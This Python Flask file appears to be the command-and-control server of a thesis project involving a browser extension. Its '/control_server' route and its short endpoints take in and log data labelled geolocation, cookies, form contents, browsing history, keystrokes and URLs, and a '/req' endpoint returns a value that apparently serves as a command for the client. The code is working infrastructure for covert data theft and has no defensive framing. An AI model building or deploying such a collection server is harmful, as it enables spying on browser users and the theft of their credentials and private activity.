

#importing the necessary libraries 
from flask import Flask, request
from markupsafe import escape
import log
import os
#creating an instance of the Flask class 
app = Flask(__name__)



@app.route("/")
def hello_world():

    log.main()
    return "<p>Hello, World!</p>"

#Manage CROS error 


#defining a route for the control server 
@app.route('/control_server', methods=['POST'])
def control_server():

    #retrieving data from the request 
    #data = request.get_json()
    print(request.get_data())
    #processing the data and returning a response 
    #response = {'status': 'success'}
    

    return "thanks"

@app.route("/g", methods=['POST'])
def g():
    log.log("Geo", request.get_data())
    return "Done"
@app.route("/c", methods=['POST'])
def c():
    log.log("Coo", request.get_data())
    return "Done"
@app.route("/f", methods=['POST'])
def f():
    log.log("Form", request.get_data())
    return "Done"
@app.route("/h", methods=['POST'])
def h():
    log.log("His", request.get_data())
    return "Done"
@app.route("/k", methods=['POST'])
def k():
    log.log("Key", request.get_data())
    return "Done"
@app.route("/u", methods=['POST'])
def u():
    log.log("Url", request.get_data())
    return "Done"
@app.route("/req", methods=['GET'])
def req():
    return "2"
#conda activate servers
#flask --app C:\Users\migue\Documents\TFG\TFGExtension\Server\app run
